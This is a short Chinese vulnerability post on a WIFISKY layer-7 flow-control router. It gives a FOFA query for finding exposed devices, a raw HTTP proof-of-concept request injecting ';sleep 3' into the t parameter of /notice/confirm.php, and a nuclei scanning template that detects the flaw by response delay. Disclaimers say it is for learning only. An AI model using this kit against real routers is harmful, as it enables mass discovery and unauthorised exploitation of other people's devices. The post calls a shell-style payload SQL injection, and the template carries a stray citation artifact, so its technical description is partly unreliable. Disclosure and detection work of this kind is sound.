#  WIFISKY-7层流控路由器SQL注入漏洞   
 HK安全小屋   2025-03-31 17:56  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
FOFA:  
```
app="WIFISKY-7层流控路由器"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI22HlT1EQQ1LicYCZL4B35kicCdz5zMT5eutmNHvu4saW7DF14HPOLbGzKgZf8JibjiaDHLkVhic1COvYg/640?wx_fmt=png&from=appmsg "")  
  
POC：  
```
GET /notice/confirm.php?t=;sleep%203 HTTP/1.1
Host: {{Hostname}}
User-Agent:Mozilla/5.0(WindowsNT10.0;Win64; x64)AppleWebKit/537.36(KHTML, likeGecko)Chrome/96.0.4664.93Safari/537.36
```  
  
t参数存在SQL注入漏洞，利用poc进行  
sql延时三秒测试，查看响应时间  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI22HlT1EQQ1LicYCZL4B35kicYiaT1UbdibXqiatP3Wu4ibn2JGhXoxdofL3EOic5tibdw3ynrtDT7WFqrRXA/640?wx_fmt=png&from=appmsg "")  
  
nuclei模板：  
```
id: wifisky-7-sql-injection

info:
  name: WIFISKY-7层流控路由器SQL注入漏洞
  author: Kimi
  severity: high
  description: WIFISKY-7层流控路由器的/notice/confirm.php接口存在SQL注入漏洞，攻击者可通过构造恶意请求导致时间延迟，从而判断漏洞存在[^6^]。
  tags: sql-injection, time-based

requests:
  - raw:
      - |
        GET /notice/confirm.php?t=;sleep%203 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0(WindowsNT10.0;Win64; x64)AppleWebKit/537.36(KHTML, likeGecko)Chrome/96.0.4664.93Safari/537.36

    matchers:
      - type: dsl
        dsl:
          - response.time > 3000
```  
### 说明：  
1. **id**  
：模板的唯一标识符，用于区分不同的模板。  
  
1. **info**  
：包含模板的基本信息，如名称、作者、严重性、描述和标签。  
  
1. **requests**  
：定义了用于测试的HTTP请求。  
  
1. **raw**  
：直接使用原始HTTP请求格式，便于精确控制请求内容。  
  
1. **matchers**  
：定义了如何判断响应是否表示漏洞存在。这里通过检测响应时间是否超过3秒来判断是否存在SQL注入漏洞  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
